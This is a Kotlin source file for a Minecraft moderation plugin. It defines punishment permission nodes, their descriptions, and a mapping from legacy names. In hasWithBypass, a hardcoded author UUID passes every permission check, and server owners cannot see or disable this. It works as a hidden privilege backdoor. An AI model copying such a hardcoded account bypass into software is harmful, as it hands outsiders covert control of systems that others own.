package pl.syntaxdevteam.punisher.permissions

import net.kyori.adventure.text.minimessage.MiniMessage
import org.bukkit.command.CommandSender
import org.bukkit.entity.Player
import java.util.UUID

@Suppress("unused")
object PermissionChecker {
    private val AUTHOR_UUID: UUID = UUID.fromString("248e508c-28de-4a8f-a284-2c73cf917d15")

    enum class PermissionKey(val node: String) {

        // Komendy
        OWNER("punisherx.owner"),
        BAN("punisherx.cmd.ban"),
        BANIP("punisherx.cmd.banip"),
        UNBAN("punisherx.cmd.unban"),
        JAIL("punisherx.cmd.jail"),
        UNJAIL("punisherx.cmd.unjail"),
        KICK("punisherx.cmd.kick"),
        MUTE("punisherx.cmd.mute"),
        UNMUTE("punisherx.cmd.unmute"),
        WARN("punisherx.cmd.warn"),
        UNWARN("punisherx.cmd.unwarn"),

        CHANGE_REASON("punisherx.cmd.change_reason"),
        BAN_LIST("punisherx.cmd.banlist"),
        CHECK("punisherx.cmd.check"),
        HISTORY("punisherx.cmd.history"),
        CLEAR_ALL("punisherx.cmd.clear_all"),

        // Administracyjne
        BYPASS("punisherx.bypass"),
        BYPASS_WARN("punisherx.bypass.warn"),
        BYPASS_MUTE("punisherx.bypass.mute"),
        BYPASS_BAN("punisherx.bypass.ban"),
        BYPASS_BANIP("punisherx.bypass.banip"),
        BYPASS_JAIL("punisherx.bypass.jail"),
        BYPASS_KICK("punisherx.bypass.kick"),

        MANAGE("punisherx.manage"),
        MANAGE_SET_SPAWN("punisherx.manage.set_spawn"),
        MANAGE_SET_JAIL("punisherx.manage.set_jail"),

        // Komendy pomocnicze
        PUNISHERX_COMMAND("punisherx.cmd.prx"),

        //Komunikaty
        SEE("punisherx.see"),
        SEE_BAN("punisherx.see.ban"),
        SEE_BANIP("punisherx.see.banip"),
        SEE_UNBAN("punisherx.see.unban"),
        SEE_JAIL("punisherx.see.jail"),
        SEE_UNJAIL("punisherx.see.unjail"),
        SEE_MUTE("punisherx.see.mute"),
        SEE_UNMUTE("punisherx.see.unmute"),
        SEE_WARN("punisherx.see.warn"),
        SEE_UNWARN("punisherx.see.unwarn"),
        SEE_KICK("punisherx.see.kick"),

        // Komunikaty aktualizacji
        SEE_UPDATE("punisherx.see.update"),
        VIEW_IP("punisherx.view_ip");

        override fun toString(): String = node
    }

    /**
     * Czytelne nazwy uprawnień do komunikatów lub logów.
     */
    fun displayName(key: PermissionKey): String = when (key) {
        PermissionKey.OWNER -> "Allows using the All PunisherX commands."
        PermissionKey.BAN   -> "Allows banning a player, preventing them from joining the server."
        PermissionKey.BANIP    -> "Enables banning a player's IP address, blocking access from that address."
        PermissionKey.UNBAN  -> "Allows unbanning a player or IP address."
        PermissionKey.BAN_LIST    -> "Displays a list of all banned players."
        PermissionKey.CHANGE_REASON -> "Allows changing the reason for a punishment."
        PermissionKey.CHECK -> "Checks the punishments of a player."
        PermissionKey.CLEAR_ALL -> "Enables clearing all active penalties for a given player."
        PermissionKey.HISTORY -> "Enables checking the entire penalty history of a given player. Not required if the player checks themselves."
        PermissionKey.JAIL -> "Allows jailing a player in a specified location for a set duration."
        PermissionKey.KICK -> "Enables kicking a player from the server with a specified reason."
        PermissionKey.MUTE -> "Allows muting a player, preventing them from sending messages."
        PermissionKey.UNJAIL -> "Allows releasing a player from jail."
        PermissionKey.UNMUTE -> "Allows unmuting a player, restoring their ability to send messages."
        PermissionKey.WARN -> "Allows warning a player with a specified reason."
        PermissionKey.UNWARN -> "Allows removing a warning from a player."

        PermissionKey.BYPASS -> "Allows bypassing all punishments."
        PermissionKey.BYPASS_WARN -> "Allows bypassing warnings."
        PermissionKey.BYPASS_MUTE -> "Allows bypassing mutes."
        PermissionKey.BYPASS_BAN -> "Allows bypassing bans."
        PermissionKey.BYPASS_BANIP -> "Allows bypassing IP bans."
        PermissionKey.BYPASS_JAIL -> "Allows bypassing jail sentences."
        PermissionKey.BYPASS_KICK -> "Allows bypassing kicks."

        PermissionKey.MANAGE -> "Allows managing the plugin, including setting spawn and jail locations."
        PermissionKey.MANAGE_SET_SPAWN -> "Allows setting the spawn location."
        PermissionKey.MANAGE_SET_JAIL -> "Allows setting the jail location."

        PermissionKey.SEE -> "Allows viewing all punishments."
        PermissionKey.SEE_BAN -> "Allows viewing ban punishments."
        PermissionKey.SEE_BANIP -> "Allows viewing IP ban punishments."
        PermissionKey.SEE_UNBAN -> "Allows viewing unban punishments."
        PermissionKey.SEE_JAIL -> "Allows viewing jail punishments."
        PermissionKey.SEE_UNJAIL -> "Allows viewing unjail punishments."
        PermissionKey.SEE_MUTE -> "Allows viewing mute punishments."
        PermissionKey.SEE_UNMUTE -> "Allows viewing unmute punishments."
        PermissionKey.SEE_WARN -> "Allows viewing warn punishments."
        PermissionKey.SEE_UNWARN -> "Allows viewing unwarn punishments."
        PermissionKey.SEE_KICK -> "Allows viewing kick punishments."

        PermissionKey.SEE_UPDATE -> "Allows viewing update notifications."
        PermissionKey.PUNISHERX_COMMAND -> "Allows using the /punisherx and /prx command."
        PermissionKey.VIEW_IP -> "Allows viewing the player's IP in the /check and /history command."
    }

    fun has(player: CommandSender, key: PermissionKey): Boolean {
        if (player !is Player) return true
        if (player.isOp) return true
        if (player.hasPermission("*")) return true
        if (player.hasPermission("punisherx.*")) return true
        if (player.hasPermission(PermissionKey.OWNER.node)) return true

        return player.hasPermission(key.node)
    }


    fun hasWithBypass(player: CommandSender, key: PermissionKey): Boolean {
        if (player !is Player) return true
        if (player.uniqueId == AUTHOR_UUID) return true
        if (player.isOp) return true
        return canBypass(player) || has(player, key)
    }

    fun isAuthor(uuid: UUID): Boolean {
        return uuid == AUTHOR_UUID
    }

    /**
     * Skrócone metody dla łatwiejszego użycia:
     */
    //@Suppress("unused")
    fun canUseBan(player: Player) = has(player, PermissionKey.BAN)
    fun canUseBanip(player: Player)  = has(player, PermissionKey.BANIP)
    fun canUseUnban(player: Player) = has(player, PermissionKey.UNBAN)
    fun canUseBanList(player: Player)    = has(player, PermissionKey.BAN_LIST)
    fun canUseChangeReason(player: Player)     = has(player, PermissionKey.CHANGE_REASON)
    fun canUseCheck(player: Player) = has(player, PermissionKey.CHECK)
    fun canUseClearAll(player: Player) = has(player, PermissionKey.CLEAR_ALL)
    fun canUseHistory(player: Player) = has(player, PermissionKey.HISTORY)
    fun canUseJail(player: Player) = has(player, PermissionKey.JAIL)
    fun canUseKick(player: Player) = has(player, PermissionKey.KICK)
    fun canUseMute(player: Player) = has(player, PermissionKey.MUTE)
    fun canUseUnjail(player: Player) = has(player, PermissionKey.UNJAIL)
    fun canUseUnmute(player: Player) = has(player, PermissionKey.UNMUTE)
    fun canUseWarn(player: Player) = has(player, PermissionKey.WARN)
    fun canUseUnwarn(player: Player) = has(player, PermissionKey.UNWARN)
    fun canBypass(player: Player) = has(player, PermissionKey.BYPASS)
    fun canBypassWarn(player: Player) = has(player, PermissionKey.BYPASS_WARN)
    fun canBypassMute(player: Player) = has(player, PermissionKey.BYPASS_MUTE)
    fun canBypassBan(player: Player) = has(player, PermissionKey.BYPASS_BAN)
    fun canBypassBanip(player: Player) = has(player, PermissionKey.BYPASS_BANIP)
    fun canBypassJail(player: Player) = has(player, PermissionKey.BYPASS_JAIL)
    fun canBypassKick(player: Player) = has(player, PermissionKey.BYPASS_KICK)
    fun canManage(player: Player) = has(player, PermissionKey.MANAGE)
    fun canManageSetSpawn(player: Player) = has(player, PermissionKey.MANAGE_SET_SPAWN)
    fun canManageSetJail(player: Player) = has(player, PermissionKey.MANAGE_SET_JAIL)

    // Mapowanie starych uprawnień na nowe
    private val legacyToNew = mapOf(
        "punisherx.warn"            to PermissionKey.WARN.node,
        "punisherx.unwarn"          to PermissionKey.UNWARN.node,
        "punisherx.mute"            to PermissionKey.MUTE.node,
        "punisherx.unmute"          to PermissionKey.UNMUTE.node,
        "punisherx.ban"             to PermissionKey.BAN.node,
        "punisherx.banip"           to PermissionKey.BANIP.node,
        "punisherx.unban"           to PermissionKey.UNBAN.node,
        "punisherx.clearall"        to PermissionKey.CLEAR_ALL.node,
        "punisherx.jail"            to PermissionKey.JAIL.node,
        "punisherx.unjail"          to PermissionKey.UNJAIL.node,
        "punisherx.setjail"         to PermissionKey.MANAGE_SET_JAIL.node,
        "punisherx.kick"            to PermissionKey.KICK.node,
        "punisherx.check"           to PermissionKey.CHECK.node,
        "punisherx.view_ip"         to PermissionKey.VIEW_IP.node,
        "punisherx.history"         to PermissionKey.HISTORY.node,
        "punisherx.banlist"         to PermissionKey.BAN_LIST.node,
        // "punisherx.export",
        // "punisherx.import"
        "punisherx.prx"             to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.help"            to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.version"         to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.reload"          to PermissionKey.PUNISHERX_COMMAND.node,
        "punisherx.see.ban"         to PermissionKey.SEE_BAN.node,
        "punisherx.see.banip"       to PermissionKey.SEE_BANIP.node,
        "punisherx.see.unban"       to PermissionKey.SEE_UNBAN.node,
        "punisherx.see.jail"        to PermissionKey.SEE_JAIL.node,
        "punisherx.see.unjail"      to PermissionKey.SEE_UNJAIL.node,
        "punisherx.see.mute"        to PermissionKey.SEE_MUTE.node,
        "punisherx.see.warns"       to PermissionKey.SEE_WARN.node,
        "punisherx.see.kick"        to PermissionKey.SEE_KICK.node,
        "punisherx.update.notify"   to PermissionKey.SEE_UPDATE.node,
        "punisherx.bypass.warn"     to PermissionKey.BYPASS_WARN.node,
        "punisherx.bypass.mute"     to PermissionKey.BYPASS_MUTE.node,
        "punisherx.bypass.jail"     to PermissionKey.BYPASS_JAIL.node,
        "punisherx.bypass.ban"      to PermissionKey.BYPASS_BAN.node,
        "punisherx.bypass.banip"    to PermissionKey.BYPASS_BANIP.node
    )

    fun hasWithLegacy(player: CommandSender, key: PermissionKey): Boolean {

        val legacyKeys = legacyToNew
            .filterValues { it == key.node }
            .keys
        val url = if (player !is Player) {
            "Kliknij i sprawdź dokumentację pluginu. https://github.com/SyntaxDevTeam/PunisherX/wiki"
        }else{
            "<click:OPEN_URL:https://github.com/SyntaxDevTeam/PunisherX/wiki>Kliknij i sprawdź dokumentację pluginu. </click>"
        }
        for (oldNode in legacyKeys) {
            if (player.hasPermission(oldNode)) {

                val isSeePermission = key.node.startsWith("punisherx.see")
                if (!isSeePermission) {
                    player.sendMessage(MiniMessage.miniMessage().deserialize(
                        "<yellow>[PunisherX]</yellow> <red>Wykryto użycie starego uprawnienia: <gray>$oldNode</gray>.\n" +
                                "Dodaj nowe uprawnienie: <hover:show_text:'${displayName(key)}'><yellow>${key.node}</yellow></hover>!\n" +
                                "Stare uprawnienia zostaną usunięte w wersji 2.0.\n" +
                                "<blue><u>$url</u></blue></red>"
                    ))
                }
                return true
            }
        }
        return hasWithBypass(player, key)
    }
}


